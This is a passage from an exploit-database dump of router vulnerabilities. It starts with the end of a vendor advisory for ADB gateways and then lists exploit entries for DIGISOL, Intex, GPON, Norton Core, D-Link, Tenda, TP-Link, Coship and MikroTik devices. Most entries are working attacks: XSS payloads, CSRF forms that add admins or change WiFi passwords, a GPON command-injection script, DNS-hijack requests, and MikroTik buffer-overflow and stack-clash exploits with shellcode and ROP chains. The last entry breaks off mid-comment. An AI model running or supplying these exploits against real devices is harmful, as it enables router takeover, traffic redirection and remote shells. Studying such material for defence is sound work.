ADB P.RG AV4202N - E_3.3.0, latest firmware version, depending on ISP
ADB DV 2210 - E_5.3.0, latest firmware version, depending on ISP
ADB VV 5522 - E_8.3.0, latest firmware version, depending on ISP
ADB VV 2220 - E_9.0.6, latest firmware version, depending on ISP
etc.
It has been confirmed by ADB that _all_ their ADB modems / gateways / routers
based on the Epicentro platform are affected by this vulnerability in all
firmware versions for all their customers (ISPs) at the time of identification
of the vulnerability _except_ those devices which have a custom UI developed
for the ISP.
Vendor contact timeline:
2016-07-01: Contacting vendor ADB, sending encrypted advisory, asking about
affected devices
2016-07-08: Receiving information about affected devices
2016-07 - 2017-04: Further coordination, waiting for firmware release,
implementation & rollout phases for their customers
2018-07-04: Embargo lifted, public release of security advisory
Solution:
The firmware versions depend on the ISP / customer of ADB and may vary!
Patch version:
ADB P.RG AV4202N >= E_3.3.2, firmware version depending on ISP
ADB DV2210 >= E_5.3.2, firmware version depending on ISP
ADB VV5522 >= E_8.3.2, firmware version depending on ISP
ADB VV2220 >= E_9.3.2, firmware version depending on ISP
etc.
Workaround:
Restrict access to the web interface and only allow trusted users.
Change any default/weak passwords to strong credentials.
Don't allow remote access to the web GUI via Internet.
Advisory URL:
SEC Consult Vulnerability Lab
SEC Consult
Europe | Asia | North America
About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.
Interested to work with the experts of SEC Consult?
Send us your application https://www.sec-consult.com/en/career/index.html
Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://www.sec-consult.com/en/contact/index.html
Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult
EOF J. Greil / @2018"
2018-06-28,WebApps,Hardware,Adipta Basu,DIGISOL DG-HR3400 Wireless Router,Cross-Site Scripting,"# Exploit Title: DIGISOL DG-HR3400 Wireless Router -  Cross-Site Scripting
# Date: 2018-06-25
# Vendor Homepage:  http://www.digisol.com
# Hardware Link: https://www.amazon.in/Digisol-DG-HR3400-300Mbps-Wireless-Broadband/dp/B00IL8DR6W
# Category: Hardware
# Exploit Author: Adipta Basu
# Tested on: Mac OS High Sierra
# CVE: N/A
# Reproduction Steps:","- Goto your Wifi Router Gateway [i.e: http://192.168.2.1]
- Go to --> ""General Setup"" --> ""Wireless"" --> ""Basic Settings""
- Open BurpSuite
- Change the SSID to ""Testing"" and hit ""Apply""
- Burp will capture the intercepts.
- Now change the SSID to <script>alert(""ADIPTA"")</script> and keep APSSID as it is
- Refresh the page, and you will get the ""ADIPTA"" pop-up"
2018-06-25,WebApps,Hardware,Samrat Das,Intex Router N-150,Arbitrary File Upload,"# Exploit Title:​​ Intex Router N-150 - Arbitrary File Upload
# Date: 2018-06-23
# Exploit Author: Samrat Das
# Version: N-150
# CVE : N/A
# Category: Router Firmware
# 1. Description
# The firmware allows malicious files to be uploaded without any checking of
# extensions and allows filed to be uploaded.
# 2. Proof of Concept","- Visit the application
- Go to the advanced settings post login
- Under backup- restore page upload any random file extension and hit go.
- Upon the file being upload, the firmware will get rebooted accepting the arbitrary file."
2018-06-25,WebApps,Hardware,Samrat Das,Intex Router N-150,Cross-Site Request Forgery (Add Admin),"# Exploit Title:​​ Intex Router N-150 - Cross-Site Request Forgery (Add Admin)
# Date: 2018-06-23
# Exploit Author: Navina Asrani
# Version: N-150
# CVE : N/A
# Category: Router Firmware
# 1. Description
# The firmware allows malicious request to be executed without verifying
# source of request. This leads to arbitrary execution with malicious request
# which will lead to the creation of a privileged user..
# 2. Proof of Concept
# Visit the application
# Go to any router setting modification page and change the values,
# create a request and observe the lack of CSRF tokens.
# Craft an html page with all the details for the built-in admin
# user creation and host it on a server
# Upon the link being clicked by a logged in admin user,
# immediately, the action will get executed
# Exploitation Technique: A attacker can create a rogue admin user to gain
# access to the application.
# Exploit code:","<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.0.1/goform/WizardHandle"" method=""POST"">
<input type=""hidden"" name=""GO"" value=""index&#46;asp"" />
<input type=""hidden"" name=""v12&#95;time"" value=""1529768448&#46;425"" />
<input type=""hidden"" name=""WANT1"" value=""3"" />
<input type=""hidden"" name=""isp"" value=""3"" />
<input type=""hidden"" name=""PUN"" value=""testuser&#95;k"" />
<input type=""hidden"" name=""PPW"" value=""123456"" />
<input type=""hidden"" name=""SSID"" value=""testwifiap"" />
<input type=""hidden"" name=""wirelesspassword"" value=""00000000"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2018-05-03,Remote,Hardware,vpnmentor,GPON Routers,Authentication Bypass / Command Injection,"#!/bin/bash
# We send the commands with two modes backtick (`) and semicolon (;) because different models trigger on different devices","echo ""[+] Sending the Command… ""
curl -k -d ""XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=\`$2\`;$2&ipv=0"" $1/GponForm/diag_Form?images/ 2>/dev/null 1>/dev/null
echo ""[+] Waiting….""
sleep 3
echo ""[+] Retrieving the ouput….""
curl -k $1/diag.html?images/ 2>/dev/null | grep ‘diag_result = ‘ | sed -e ‘s/\\n/\n/g’"
2018-05-02,Remote,Hardware,embedi,Norton Core Secure WiFi Router,'BLE' Command Injection (PoC),# PoC command injection in BLE service of Norton Core Secure WiFi Router (CVE-2018-5234),"For more information read
[paper](https://embedi.com/blog/whos-watching-the-watchers-vol-ii-norton-core-secure-wifi-router).
To demonstrate the exploitation, we will use:
- OS GNU/Linux;
- Bluetooth dongle adapter;
- BlueZ utility (for testing Bluetooth connection).
In order to use the script, we will need to set all dependencies in a advance:
```shell
$ pip install -r ./requirements.txt
With the help of `BlueZ` utilities, we should ensure Bluetooth is enabled and
functions properly.
1. Restart the router to provide access to the engineering page.
2. Start the PoC on behalf of the root user (required for operating with
Bluetooth) with the command on executing as an argument:
```shell
$ ./ble_norton_core.py ""/etc/init.d/dropbear start""
After the script is successfully executed, we get access to the device via
the SSH connection. We put `root` as a user and `admin` as password:
```shell
$ ssh root@norton.core
Download: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/44574.zip"
2018-04-17,Remote,Hardware,Sayan Chatterjee,D-Link DIR-615 Wireless Router,Persistent Cross Site Scripting,"# Exploit Title: D-Link DIR-615 Wireless Router - Persistent Cross Site Scripting (XSS)
# Date: 14.04.2018
# Exploit Author: Sayan Chatterjee
# Vendor Homepage: http://www.dlink.co.in
# Hardware Link: http://www.dlink.co.in/products/?pid=678
# Category: Hardware (Wi-fi Router)
# Hardware Version: T1
# Firmware Version: 20.07
# Tested on: Windows 10
# CVE: CVE-2018-10110","Reproduction Steps:
1. Go to your wi-fi router gateway [i.e: http://192.168.0.1]
2. Go to –> “Maintenance” –> “Admin”
3. Create a user with name alert_""HI""
4. Refresh the page and you will be having “HI” popup"
2018-03-30,WebApps,ASP,Todor Donev,Tenda W3002R/A302/w309r Wireless Router v5.07.64_en,Remote DNS Change (PoC),"#  Tenda W3002R/A302/w309r Wireless Router V5.07.64_en
#  Cookie Session Weakness Remote DNS Change PoC
#  Copyright 2018 (c) Todor Donev <todor.donev at gmail.com>
#  https://ethical-hacker.org/
#  https://facebook.com/ethicalhackerorg
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","GET -H ""Cookie: admin:language=en; path=/"" ""http://<TARGET>/goform/AdvSetDns?GO=wan_dns.asp&rebootTag=&DSEN=1&DNSEN=on&DS1=<DNS1>&DS2=<DNS2>"" 2>/dev/null"
2018-03-30,WebApps,PHP,Gem George,D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Router,Authentication Bypass,"# Exploit Title: D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Route Authentication Bypass
# CVE: CVE-2018-9032
# Date: 24-03-2018
# Exploit Author: Gem George
# Author Contact: https://www.linkedin.com/in/gemgrge
# Vulnerable Product: D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Router http://www.dlink.co.in/products/?pid=628
# Firmware version: 1.02-2.06
# Hardware version: A1, B1
# Vendor Homepage: https://dlink.com","Vulnerability Details
An authentication bypass vulnerability on D-Link DIR-850L Wireless AC1200 Dual Band Gigabit Cloud Router potentially allows attackers to bypass SharePort Web Access Portal by directly accessing authenticated pages such as /category_view.php or /folder_view.php. This could potentially allow unauthorized remote access of media stored in SharePort and may perform write operation in the portal
How to exploit
Directly call authenticated URLs to bypass authentication
Examples:
* http://[router_ip][port]/category_view.php
* http://[router_ip][port]/folder_view.php
POC
* https://youtu.be/Wmm4p8znS3s"
2018-03-30,WebApps,ASP,Todor Donev,Tenda W316R Wireless Router 5.07.50,Remote DNS Change,"#  Tenda W316R Wireless Router V5.07.50
#  Cookie Session Weakness Remote DNS Change PoC
#  Copyright 2018 (c) Todor Donev <todor.donev at gmail.com>
#  https://ethical-hacker.org/
#  https://facebook.com/ethicalhackerorg
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","GET -H ""Cookie: admin:language=en; path=/"" ""http://<TARGET>/goform/AdvSetDns?GO=wan_dns.asp&rebootTag=&DSEN=1&DNSEN=on&DS1=<DNS1>&DS2=<DNS2>"" 2>/dev/null"
2018-03-30,WebApps,ASP,Todor Donev,Tenda W308R v2 Wireless Router 5.07.48,(Cookie Session) Remote DNS Change,"#  Tenda W308R v2 Wireless Router V5.07.48
#  Cookie Session Weakness Remote DNS Change PoC
#  Copyright 2018 (c) Todor Donev <todor.donev at gmail.com>
#  https://ethical-hacker.org/
#  https://facebook.com/ethicalhackerorg
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","GET -H ""Cookie: admin:language=en; path=/"" ""http://<TARGET>/goform/AdvSetDns?GO=wan_dns.asp&rebootTag=&DSEN=1&DNSEN=on&DS1=<DNS1>&DS2=<DNS2>"" 2>/dev/null"
2018-03-28,WebApps,Hardware,Todor Donev,Tenda N11 Wireless Router 5.07.43_en_NEX01,Remote DNS Change,"#!/bin/bash
#  Tenda N11 Wireless Router V5.07.43_en_NEX01
#  Cookie Session Weakness Remote DNS Change PoC Exploit
#  Copyright 2018 (c) Todor Donev <todor.donev at gmail.com>
#  https://ethical-hacker.org/
#  https://facebook.com/ethicalhackerorg
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
# Proof Of Concept 2:
# [todor@paladium ~]$ GET ""http://133.7.13.37:8080/advance.asp"" | grep def_password= | sed 's/def_password=/ Password: /g'
#  Password: ""Ethical-Hacker-Bulgaria-2o18"";
# [todor@paladium ~]$","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""        Tenda N11 Wireless Router V5.07.43_en_NEX01 ""
echo ""    Cookie Session Weakness Remote DNS Change PoC Exploit""
echo ""  ===========================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""  Copyright 2018 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://ethical-hacker.org/ https://fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -H ""Cookie: admin:language=en; path=/"" ""http://$1/goform/AdvSetDns?GO=wan_dns.asp&rebootTag=&DSEN=1&DNSEN=on&DS1=$2&DS2=$3"" 2>/dev/null"
2018-03-23,WebApps,Hardware,Mans van Someren,TL-WR720N 150Mbps Wireless N Router,Cross-Site Request Forgery,,"Exploit Title: TL-WR720N 150Mbps Wireless N Router - CSRF
Date: 21-3-2018
Exploit Author: Mans van Someren
Vendor Homepage: https://www.tp-link.com/
Software Link: https://static.tp-link.com/resources/software/TL-WR720N_V1_130719.zip
Version: All versions because its a 0day
Testen on: Google Chrome - Windows 10
this is only a portforwarding & change wifi password PoC but every action I found on the router is vulnerable to CSRF
var ROUTER_HOSTS = ['192.168.0.1', '192.168.1.1'];
var ROUTER_PORTS = ['80', '8080'];
function portforward(router_host, router_port, host, port) {
var img = new Image();
img.src = 'http://' + router_host + ':' + router_port + '/userRpm/VirtualServerRpm.htm?Port=' + port + '&Ip=' + host + '&Protocol=1&State=1&Commonport=0&Changed=0&SelIndex=0&Page=1&Save=Save';
function change_wifi_pass(router_host, router_port, newpass) {
var img = new Image();
img.src = 'http://' + router_host + ':' + router_port + '/userRpm/WlanSecurityRpm.htm?vapIdx=1&wepSecOpt=3&keytype=1&keynum=1&key1=&length1=0&key2=&length2=0&key3=&length3=0&key4=&length4=0&wpaSecOpt=3&wpaCipher=1&radiusIp=&radiusPort=1812&radiusSecret=&intervalWpa=86400&secType=3&pskSecOpt=2&pskCipher=3&pskSecret=' + newpass + '&interval=86400&Save=Save';
for (var i = 0; i < ROUTER_HOSTS.length; i++) {
for (var j = 0; j < ROUTER_PORTS.length; j++) {
portforward(ROUTER_HOSTS[i], ROUTER_PORTS[j], '192.168.0.1', '23');
change_wifi_pass(ROUTER_HOSTS[i], ROUTER_PORTS[j], 'pwned123');"
2018-03-20,WebApps,Hardware,Sayan Chatterjee,Coship RT3052 Wireless Router,Persistent Cross-Site Scripting,"# Exploit Title: Coship RT3052 Wireless Router - Persistent Cross Site Scripting (XSS)
# Date: 2018-03-18
# Exploit Author: Sayan Chatterjee
# Vendor Homepage: http://en.coship.com/
# Category: Hardware (Wifi Router)
# Version: 4.0.0.48
# Tested on: Windows 10
# CVE: CVE-2018-8772","Proof of Concept
URL: http://192.168.1.254 (Wifi Router Gateway)
Attack Vector : Network Name(SSID)
Payload : <script>alert(""S@Y@N"")</script>
Reproduction Steps:
1. Access the wifi router gateway [i.e, http://192.168.1.254]
2. Go to ""Wireless Setting"" -> ""Basic""
3. Update ""Network Name(SSID)"" field with '<script>alert(""S@Y@N"")</script>'
4. Save the settings.
5. Go to ""System Status"" and you will be having ""S@Y@N"" popup."
2018-03-15,Remote,Hardware,CoreLabs,MikroTik RouterOS < 6.41.3/6.42rc27,SMB Buffer Overflow,"#!/usr/bin/env python
# trick from http://shell-storm.org/shellcode/files/shellcode-881.php
# will place the socket file descriptor in eax
# dup stdin-stdout-stderr so we can reuse the existing connection
# execve - cannot pass the 2nd arg as NULL or busybox will complain
# build shellcode
# rop to mprotect and make the heap executable
# the heap base is not being subject to ASLR for whatever reason, so let's take advantage of it
# we do not really care about the initial register values other than overwriting the saved ret address
# the server closes the first connection, so we need to open another one","import socket
import struct
import sys
import telnetlib
NETBIOS_SESSION_MESSAGE = ""\x00""
NETBIOS_SESSION_REQUEST = ""\x81""
NETBIOS_SESSION_FLAGS = ""\x00""
find_sock_fd = ""\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48""
dup_fds = ""\x89\xc3\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9""
execve_bin_sh = ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80""
shellcode = find_sock_fd + dup_fds + execve_bin_sh
p = lambda x : struct.pack('I', x)
rop = """"
rop += p(0x0804c39d) # 0x0804c39d: pop ebx; pop ebp; ret;
rop += p(0x08072000) # ebx -> heap base
rop += p(0xffffffff) # ebp -> gibberish
rop += p(0x080664f5) # 0x080664f5: pop ecx; adc al, 0xf7; ret;
rop += p(0x14000)    # ecx -> size for mprotect
rop += p(0x08066f24) # 0x08066f24: pop edx; pop edi; pop ebp; ret;
rop += p(0x00000007) # edx -> permissions for mprotect -> PROT_READ | PROT_WRITE | PROT_EXEC
rop += p(0xffffffff) # edi -> gibberish
rop += p(0xffffffff) # ebp -> gibberish
rop += p(0x0804e30f) # 0x0804e30f: pop ebp; ret;
rop += p(0x0000007d) # ebp -> mprotect system call
rop += p(0x0804f94a) # 0x0804f94a: xchg eax, ebp; ret;
rop += p(0xffffe42e) # 0xffffe42e; int 0x80; pop ebp; pop edx; pop ecx; ret - from vdso - not affected by ASLR
rop += p(0xffffffff) # ebp -> gibberish
rop += p(0x0)     # edx -> zeroed out
rop += p(0x0)     # ecx -> zeroed out
rop += p(0x0804e30f) # 0x0804e30f: pop ebp; ret;
rop += p(0x08075802) # ebp -> somewhere on the heap that will (always?) contain user controlled data
rop += p(0x0804f94a) # 0x0804f94a: xchg eax, ebp; ret;
rop += p(0x0804e153) # jmp eax; - jump to our shellcode on the heap
offset_to_regs = 83
ebx = p(0x45454545)
esi = p(0x45454545)
edi = p(0x45454545)
ebp = p(0x45454545)
eip = p(0x0804886c) # 0x0804886c: ret;
payload = ""\xff"" * offset_to_regs + ebx + esi + edi + ebp + eip + rop
header = struct.pack(""!ccH"", NETBIOS_SESSION_REQUEST, NETBIOS_SESSION_FLAGS, len(payload))
buf = header + payload
def open_connection(ip):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, 139))
return s
def store_payload(s):
print ""[+] storing payload on the heap""
s.send((NETBIOS_SESSION_MESSAGE + ""\x00\xeb\x02"") * 4000 + ""\x90"" * 16 + shellcode)
def crash_smb(s):
print ""[+] getting code execution""
s.send(buf)
if __name__ == ""__main__"":
if len(sys.argv) != 2:
print ""%s ip"" % sys.argv[0]
sys.exit(1)
s = open_connection(sys.argv[1])
store_payload(s)
t = telnetlib.Telnet()
t.sock = open_connection(sys.argv[1])
crash_smb(t.sock)
print ""[+] got shell?""
t.interact()"
2018-03-12,Remote,Hardware,Lorenzo Santina,MikroTik RouterOS < 6.38.4 (x86),'Chimay Red' Stack Clash Remote Code Execution,"#!/usr/bin/env python2
# Mikrotik Chimay Red Stack Clash Exploit by wsxarcher (based on BigNerd95 POC)
# tested on RouterOS 6.38.4 (x86)
# ASLR enabled on libs only
# DEP enabled
# pwntools filters out JOP gadgets
# https://github.com/Gallopsled/pwntools/blob/5d537a6189be5131e63144e20556302606c5895e/pwnlib/rop/rop.py#L1074
# www PLT symbols
# Gadgets to clean the stack from arguments
# Gadget to jump on the result of dlsym (address of system)
# get the address of the first writable segment to store strings
# only search for single chars
# [bugged, some problem with dots, not used]
# search chunks of string
# ROP chain
# The server is automatically restarted after 3 secs, so we make it crash with a random address
# 1) Start 2 threads
# open 2 socket so 2 threads are created
# 2) Stack Clash
# 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
# 2.2) send some bytes as post data to socket 1 (thread A)
# 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
# 3) Send ROP chain
# 4) Start ROP chain","import socket, time, sys, struct
from pwn import *
import ropgadget
AST_STACKSIZE = 0x800000 # default stack size per thread (8 MB)
ROS_STACKSIZE =  0x20000 # newer version of ROS have a different stack size per thread (128 KB)
SKIP_SPACE    =   0x1000 # 4 KB of ""safe"" space for the stack of thread 2
ROP_SPACE     =   0x8000 # we can send 32 KB of ROP chain!
ALIGN_SIZE    = 0x10 # alloca align memory with ""content-length + 0x10 & 0xF"" so we need to take it into account
ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
context(arch=""i386"", os=""linux"", log_level=""WARNING"")
gadgets = dict()
plt = dict()
strings = dict()
system_chunks = []
cmd_chunks = []
def makeHeader(num):
return bytes(""POST /jsproxy HTTP/1.1\r\nContent-Length: "") + bytes(str(num)) + bytes(""\r\n\r\n"")
def makeSocket(ip, port):
s = socket.socket()
try:
s.connect((ip, port))
except:
print(""Error connecting to socket"")
sys.exit(-1)
print(""Connected"")
time.sleep(0.5)
return s
def socketSend(s, data):
try:
s.send(data)
except:
print(""Error sending data"")
sys.exit(-1)
print(""Sent"")
time.sleep(0.5)
def ropCall(function_address, *arguments):
payload = struct.pack('<L', function_address)
num_arg = len(arguments)
if num_arg > 0:
if num_arg == 1:
ret_gadget = gadgets['p']
elif num_arg == 2:
ret_gadget = gadgets['pp']
elif num_arg == 3:
ret_gadget = gadgets['ppp']
elif num_arg == 4:
ret_gadget = gadgets['pppp']
else:
raise
payload += struct.pack('<L', ret_gadget)
for arg in arguments:
payload += struct.pack('<L', arg)
return payload
def ropSearchJmp(elf, instruction):
oldargv = sys.argv
sys.argv = ['ropgadget', '--binary', elf.path, '--only', 'jmp']
args = ropgadget.args.Args().getArgs()
core = ropgadget.core.Core(args)
core.do_binary(elf.path)
core.do_load(0)
sys.argv = oldargv
for gadget in core._Core__gadgets:
address = gadget['vaddr'] - elf.load_addr + elf.address
if gadget['gadget'] == instruction:
return address
raise
def loadOffsets(binary, shellCmd):
elf = ELF(binary)
rop = ROP(elf)
if len([_ for _ in elf.search(""pthread_attr_setstacksize"")]) > 0:
global AST_STACKSIZE
AST_STACKSIZE = ROS_STACKSIZE
plt[""strncpy""] = elf.plt['strncpy']
plt[""dlsym""]   = elf.plt['dlsym']
gadgets['pppp'] = rop.search(regs=[""ebx"", ""esi"", ""edi"", ""ebp""]).address
gadgets['ppp'] = rop.search(regs=[""ebx"", ""ebp""], move=(4*4)).address
gadgets['pp'] = rop.search(regs=[""ebx"", ""ebp""]).address
gadgets['p'] = rop.search(regs=[""ebp""]).address
gadgets['jeax'] = ropSearchJmp(elf, ""jmp eax"")
system_chunks.extend(searchStringChunksLazy(elf, ""system\x00""))
cmd_chunks.extend(searchStringChunksLazy(elf, shellCmd + ""\x00""))
writable_address = elf.writable_segments[0].header.p_paddr
strings['system'] = writable_address
strings['cmd']    = writable_address + 0xf
def generateStrncpyChain(dst, chunks):
chain = """"
offset = 0
for (address, length) in chunks:
chain += ropCall(plt[""strncpy""], dst + offset, address, length)
offset += length
return chain
def searchStringChunksLazy(elf, string):
chunks = []
for b in string:
res = [_ for _ in elf.search(b)]
if len(res) > 0:
chunks.append((res[0], 1))
else:
raise
if len(string) != len(chunks):
raise
return chunks
def searchStringChunks(elf, string):
chunks = []
total = len(string)
if string == """":
raise
looking = string
while string != """":
results = [_ for _ in elf.search(looking)]
if len(results) > 0:
chunks.append((results[0], len(looking)))
string = string[len(looking):]
looking = string
else:   # search failed
looking = looking[:-1] # search again removing last char
check_length = 0
for (address, length) in chunks:
check_length = check_length + length
if check_length == total:
return chunks
else:
raise
def buildROP(binary, shellCmd):
loadOffsets(binary, shellCmd)
exploit  = generateStrncpyChain(strings['system'], system_chunks) # w_segment = ""system""
exploit += generateStrncpyChain(strings['cmd'], cmd_chunks)       # w_segment = ""bash cmd""
exploit += ropCall(plt[""dlsym""], 0, strings['system']) # dlsym(0, ""system""), eax = libc.system
exploit += ropCall(gadgets['jeax'], strings['cmd'])    # system(""cmd"")
exploit += struct.pack('<L', 0x13371337)
return exploit
def stackClash(ip, port, ropChain):
print(""Opening 2 sockets"")
s1 = makeSocket(ip, port) # socket 1, thread A
s2 = makeSocket(ip, port) # socket 2, thread B
print(""Stack clash..."")
socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
print(""Sending payload"")
socketSend(s1, ropChain) # thread A writes the ROP chain in the stack of thread B
print(""Starting exploit"")
s2.close() # close socket 2 to return from the function of thread B and start ROP chain
print(""Done!"")
def crash(ip, port):
print(""Crash..."")
s = makeSocket(ip, port)
socketSend(s, makeHeader(-1))
socketSend(s, b'A' * 0x1000)
s.close()
time.sleep(2.5) # www takes up to 3 seconds to restart
if __name__ == ""__main__"":
if len(sys.argv) == 5:
ip       = sys.argv[1]
port     = int(sys.argv[2])
binary   = sys.argv[3]
shellCmd = sys.argv[4]
print(""Building ROP chain..."")
ropChain = buildROP(binary, shellCmd)
print(""The ROP chain is "" + str(len(ropChain)) + "" bytes long ("" + str(ROP_SPACE) + "" bytes available)"")
crash(ip, port) # should make stack clash more reliable
stackClash(ip, port, ropChain)
else:
print(""Usage: ./StackClashROPsystem.py IP PORT binary shellcommand"")"
2018-03-12,Remote,Hardware,Lorenzo Santina,MikroTik RouterOS < 6.38.4 (MIPSBE),'Chimay Red' Stack Clash Remote Code Execution,"#!/usr/bin/env python3
# Mikrotik Chimay Red Stack Clash Exploit by BigNerd95
# Tested on RouterOS 6.38.4 (mipsbe) [using a CRS109]
# Used tools: pwndbg, rasm2, mipsrop for IDA
# I used ropper only to automatically find gadgets
# ASLR enabled on libs only
# DEP NOT enabled
# Here the shellcode will write the arguments for execve: [""/bin/bash"", ""-c"", ""shellCmd"", NULL] and [NULL]
# XX XX XX XX  <-- here the shell code will write the address of string ""/bin/bash""                           [shellcode_start_address -16]             <--- argv_array
# XX XX XX XX  <-- here the shell code will write the address of string ""-c""                                  [shellcode_start_address -12]
# XX XX XX XX  <-- here the shell code will write the address of string ""shellCmd""                            [shellcode_start_address  -8]
